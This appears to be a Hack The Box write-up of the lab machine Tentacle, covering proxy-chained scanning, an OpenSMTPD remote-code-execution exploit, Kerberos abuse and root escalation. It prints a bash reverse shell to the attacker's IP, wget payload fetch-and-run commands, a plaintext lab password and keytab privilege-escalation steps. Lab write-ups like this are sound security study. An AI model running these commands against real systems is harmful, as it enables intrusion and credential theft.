---
title: "HTB - Tentacle"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "Squid Proxy", "Kerberos", "SMTP Exploit", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

Initial Nmap scan revealed:

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
3128/tcp open  squid-http
```

Further service detection:

```bash
sudo nmap -sCV -p 22,53,88,3128 10.10.10.224 -oN targeted
```

- Discovered Squid Proxy on port 3128
- Email: `j.nakazawa@realcorp.htb`
- Hostname: `srv01.realcorp.htb`

Added entries to `/etc/hosts`:

```
10.10.10.224 srv01.realcorp.htb realcorp.htb
```

## 🌐 DNS Enumeration

Used `dig` to find authoritative name servers:

```bash
dig @10.10.10.224 realcorp.htb ns
```

Found:

```
ns.realcorp.htb. -> 10.197.243.77
```

Also discovered:

- `proxy.realcorp.htb` (CNAME)
- `wpad.realcorp.htb` (A -> 10.197.243.31)

Updated `/etc/hosts`:

```
10.197.243.77 proxy.realcorp.htb
10.197.243.31 wpad.realcorp.htb
```

## 🔄 Proxy Enumeration (Multi-hop)

Configured `/etc/proxychains.conf`:

```
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
```

This allowed proxy traversal to reach internal networks.

### Scanning 10.197.243.77

```bash
proxychains -q nmap -sT -Pn -v -n 10.197.243.77
```

Found:

```
22, 53, 88, 464, 749, 3128
```

### Scanning 10.197.243.31 (via nested proxy)

Found:

```
22, 53, 80, 88, 464, 749, 3128
```

Checked `wpad.dat`:

```bash
proxychains -q curl -s http://wpad.realcorp.htb/wpad.dat
```

Revealed another subnet: `10.241.251.0/24`

## 🔍 Discovering Hidden Host

Brute-forced the internal subnet:

```bash
for port in 21 22 25 80 88 443 8080; do
  for i in $(seq 1 254); do
    proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] Port $port open on 10.241.251.$i" &
  done; wait
done
```

Found:

- 10.241.251.113:25 (SMTP)

## ✉️ SMTP Exploitation

Discovered `OpenSMTPD 2.0.0` on port 25:

```bash
proxychains -q nmap -sCV -p25 10.241.251.113
```

Used exploit [EDB 47984](https://www.exploit-db.com/exploits/47984):

```bash
searchsploit -m linux/remote/47984.py
```

Changed recipient to known user: `j.nakazawa@realcorp.htb`

### Gained RCE:

```bash
proxychains -q python3 47984.py 10.241.251.113 25 'wget 10.10.14.3'
```

Confirmed interaction via Python HTTP server.

## 🐚 Reverse Shell

1. Created `index.html` with bash reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

2. Delivered payload:

```bash
proxychains -q python3 47984.py 10.241.251.113 25 'wget 10.10.14.3 -O /dev/shm/rev'
```

3. Executed reverse shell:

```bash
proxychains -q python3 47984.py 10.241.251.113 25 'bash /dev/shm/rev'
```

Got root access on container `10.241.251.113`.

## 🔑 Credential Discovery

Found `.msmtprc`:

```
user: j.nakazawa
password: sJB}RM>6Z~64_
```

Used `kinit j.nakazawa` to authenticate via Kerberos.  
Updated `/etc/krb5.conf` for `REALCORP.HTB`.

## 🔁 SSH with Kerberos

Modified `/etc/hosts` to include:

```
10.10.10.224 srv01.realcorp.htb realcorp.htb
```

Connected with:

```bash
ssh -K j.nakazawa@10.10.10.224
```

## ⬆️ Privilege Escalation via Cron

Found in `/etc/crontab`:

```
* * * * * admin /usr/local/bin/log_backup.sh
```

Created `.k5login` in `/var/log/squid/` with:

```
j.nakazawa@REALCORP.HTB
```

After cron runs, connected via:

```bash
ssh -K admin@10.10.10.224
```

## 🎯 Root via Kerberos Keytab

Found `/etc/krb5.keytab` readable.

Used:

```bash
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
addprinc root@REALCORP.HTB
```

Then:

```bash
ksu
```

🏁 **Root access achieved through multi-proxy, multi-network, Kerberos-authenticated escalation.**
